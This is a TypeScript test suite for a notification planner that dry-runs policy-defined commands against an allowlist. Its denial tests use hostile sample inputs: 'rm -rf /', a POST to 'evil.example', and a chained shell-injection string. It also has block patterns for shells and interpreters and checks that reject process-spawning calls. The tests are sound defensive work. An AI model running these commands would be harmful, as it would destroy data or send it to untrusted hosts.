import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { test } from "node:test";
import {
  parseAllowlist,
  parsePolicy,
  planNotification,
  type NotifyEvent,
} from "../src/notify.js";

const policy = await readFile(new URL("../../templates/notify.policy.example.md", import.meta.url), "utf8");
const allowlistRaw = await readFile(
  new URL("../../templates/notify.allowlist.example.json", import.meta.url),
  "utf8",
);
const rules = parsePolicy(policy);
const allowlist = parseAllowlist(allowlistRaw);

function event(overrides: Partial<NotifyEvent> = {}): NotifyEvent {
  return {
    id: "evt_example",
    type: "needs_review",
    title: "Ready",
    summary: "Evidence is attached.",
    priority: "normal",
    source_task_id: "task_1",
    ...overrides,
  };
}

test("example policy and allowlist dry-run high and normal events without executing", () => {
  const high = planNotification(event({ priority: "high" }), rules, allowlist);
  assert.equal(high.mode, "dry-run");
  assert.equal(high.executed, false);
  assert.equal(high.allow, true);
  assert.equal(high.reason, "allowlisted");
  assert.equal(high.matched_rule, "high priority page");
  assert.deepEqual(high.argv, ["curl", "-X", "POST", "https://hooks.example/ship"]);
  assert.equal(high.pattern, "curl -X POST https://hooks.example/*");

  const normal = planNotification(event({ priority: "normal" }), rules, allowlist);
  assert.equal(normal.executed, false);
  assert.equal(normal.allow, true);
  assert.equal(normal.matched_rule, "captain inbox");
  assert.deepEqual(normal.argv, ["multica", "inbox", "push"]);
  assert.equal(normal.pattern, "multica *");
});

test("dry-run denies commands outside the example allowlist", () => {
  const hostile = parsePolicy(`## Rule: no

when.type: needs_review
action: rm -rf /
`);
  const denied = planNotification(event(), hostile, allowlist);
  assert.equal(denied.allow, false);
  assert.equal(denied.executed, false);
  assert.equal(denied.reason, "not_allowlisted");

  const wrongHost = parsePolicy(`## Rule: no

when.type: needs_review
action: curl -X POST https://evil.example/hook
`);
  const offHost = planNotification(event(), wrongHost, allowlist);
  assert.equal(offHost.allow, false);
  assert.equal(offHost.reason, "not_allowlisted");

  const pipeline = parsePolicy(`## Rule: no

when.type: needs_review
action: curl -X POST https://hooks.example/ship; rm -rf /
`);
  const shelled = planNotification(event(), pipeline, allowlist);
  assert.equal(shelled.allow, false);
  assert.equal(shelled.reason, "shell_metacharacter");
  assert.equal(shelled.argv, null);
});

test("a bare multica command does not match the trailing star", () => {
  const rule = parsePolicy(`## Rule: short

when.type: needs_review
action: multica
`);
  const plan = planNotification(event(), rule, allowlist);
  assert.equal(plan.allow, false);
  assert.equal(plan.reason, "not_allowlisted");
});

test("unrelated events match no rule", () => {
  const plan = planNotification(event({ type: "proposal_ready" }), rules, allowlist);
  assert.equal(plan.allow, false);
  assert.equal(plan.reason, "no_matching_rule");
  assert.equal(plan.executed, false);
});

test("allowlist rejects shells, bare wildcards, and shell syntax", () => {
  assert.throws(() => parseAllowlist(JSON.stringify({ patterns: ["*"] })), /literal program name/);
  assert.throws(() => parseAllowlist(JSON.stringify({ patterns: ["bash *"] })), /shell or sudo/);
  assert.throws(() => parseAllowlist(JSON.stringify({ patterns: ["curl; rm *"] })), /shell syntax/);
  assert.throws(() => parseAllowlist(JSON.stringify({ patterns: ["python *"] })), /interpreter/);
});

test("notify sources do not start a child process", async () => {
  for (const name of ["notify.ts", "inbox.ts", "cli.ts"]) {
    const source = await readFile(new URL(`../src/${name}`, import.meta.url), "utf8");
    assert.doesNotMatch(source, /child_process/);
    assert.doesNotMatch(source, /\b(spawn|execFile|execSync|spawnSync)\s*\(/);
  }
});

test("event schema is JSON and describes needs_review", async () => {
  const schema = JSON.parse(await readFile(new URL("../../events/schema.json", import.meta.url), "utf8"));
  assert.equal(schema.title, "agent-ship-kit event");
  assert.ok(schema.properties.priority.enum.includes("high"));
  assert.ok(schema.properties.priority.enum.includes("normal"));
  assert.deepEqual(schema.properties.links.properties && Object.keys(schema.properties.links.properties).sort(), [
    "issue",
    "path",
    "pr",
  ]);
  const needsReview = schema.allOf.find(
    (entry: { then?: { required?: string[] } }) => entry.then?.required?.includes("evidence_urls"),
  );
  assert.ok(needsReview);
  assert.equal(schema.examples[0].type, "needs_review");
});
